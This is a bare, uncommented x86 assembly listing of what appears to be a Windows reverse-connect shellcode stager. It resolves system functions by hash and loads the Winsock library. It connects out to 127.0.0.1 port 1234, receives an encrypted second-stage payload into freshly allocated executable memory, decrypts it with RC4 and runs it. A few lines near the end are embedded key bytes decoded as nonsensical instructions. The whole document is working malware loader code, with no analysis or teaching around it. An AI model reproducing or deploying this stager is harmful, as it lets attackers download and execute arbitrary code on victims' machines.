```asm
_start:
cld
call L_95
RET_6:
pushal
mov ebp, esp
xor edx, edx
mov edx, dword ptr fs:[edx + 0x30]
mov edx, dword ptr [edx + 0xc]
mov edx, dword ptr [edx + 0x14]
L_15:
mov esi, dword ptr [edx + 0x28]
xor edi, edi
movzx ecx, word ptr [edx + 0x26]
L_1e:
xor eax, eax
lodsb al, byte ptr [esi]
cmp al, 0x61
jl L_27
sub al, 0x20
L_27:
ror edi, 0xd
add edi, eax
dec ecx
jne L_1e
push edx
mov edx, dword ptr [edx + 0x10]
push edi
mov eax, dword ptr [edx + 0x3c]
add eax, edx
mov eax, dword ptr [eax + 0x78]
test eax, eax
je L_8c
add eax, edx
mov ecx, dword ptr [eax + 0x18]
mov ebx, dword ptr [eax + 0x20]
add ebx, edx
push eax
L_4b:
test ecx, ecx
je L_8b
dec ecx
mov esi, dword ptr [ebx + ecx*4]
add esi, edx
xor edi, edi
L_57:
xor eax, eax
ror edi, 0xd
lodsb al, byte ptr [esi]
add edi, eax
cmp al, ah
jne L_57
add edi, dword ptr [ebp - 8]
cmp edi, dword ptr [ebp + 0x24]
jne L_4b
pop eax
mov ebx, dword ptr [eax + 0x24]
add ebx, edx
mov cx, word ptr [ebx + ecx*2]
mov ebx, dword ptr [eax + 0x1c]
add ebx, edx
mov eax, dword ptr [ebx + ecx*4]
add eax, edx
mov dword ptr [esp + 0x24], eax
pop ebx
pop ebx
popal
pop ecx
pop edx
push ecx
jmp eax
L_8b:
pop eax
L_8c:
pop edi
pop edx
mov edx, dword ptr [edx]
jmp L_15
L_95:
pop ebp
push 0x3233
push 0x5f327377
push esp
push 0x726774c
mov eax, ebp
call eax
mov eax, 0x190
sub esp, eax
push esp
push eax
push 0x6b8029
call ebp
push 0xa
L_bc:
push 0x100007f
push 0xd2040002
mov esi, esp
push eax
push eax
push eax
push eax
inc eax
push eax
inc eax
push eax
push 0xe0df0fea
call ebp
xchg edi, eax
L_d8:
push 0x10
push esi
push edi
push 0x6174a599
call ebp
test eax, eax
je L_f1
dec dword ptr [esi + 8]
jne L_d8
L_ec:
call L_1cd
L_f1:
push 0
push 4
push esi
push edi
push 0x5fc8d902
call ebp
cmp eax, 0
jle L_14c
mov esi, dword ptr [esi]
xor esi, 0xd3a205a0
lea ecx, [esi + 0x100]
push 0x40
push 0x1000
push ecx
push 0
push 0xe553a458
call ebp
lea ebx, [eax + 0x100]
push ebx
push esi
push eax
L_12b:
push 0
push esi
push ebx
push edi
push 0x5fc8d902
call ebp
cmp eax, 0
jge L_164
pop eax
push 0x4000
push 0
push eax
push 0x300f2f0b
call ebp
L_14c:
push edi
push 0x614d6e75
call ebp
pop esi
pop esi
dec dword ptr [esp]
jne L_bc
jmp L_ec
L_164:
add ebx, eax
sub esi, eax
jne L_12b
pop ebx
pop ecx
pop ebp
push ebp
push edi
mov edi, ebx
call L_186
xor al, 0x2a
push 0x53d0a27e
pushal
leave
push ebx
adc byte ptr [edx - 0x35], bh
.equ L_186, $ + 3
call 0x315e09c6
shr byte ptr [edx - 0x48a3f02], 0x81
out dx, eax
add byte ptr [ecx], al
add byte ptr [eax], al
xor ebx, ebx
jmp L_196
L_1b0:
inc al
add bl, byte ptr [edi + eax]
mov dl, byte ptr [edi + eax]
xchg byte ptr [edi + ebx], dl
mov byte ptr [edi + eax], dl
add dl, byte ptr [edi + ebx]
mov dl, byte ptr [edi + edx]
xor byte ptr [ebp], dl
inc ebp
dec ecx
jne L_1b0
pop edi
ret
L_196:
add bl, byte ptr [edi + eax]
mov edx, eax
and dl, 0xf
add bl, byte ptr [esi + edx]
mov dl, byte ptr [edi + eax]
xchg byte ptr [edi + ebx], dl
mov byte ptr [edi + eax], dl
inc al
jne L_196
xor ebx, ebx
jmp L_1b0
L_1cd:
mov ebx, 0x56a2b5f0
push 0
push ebx
call ebp
```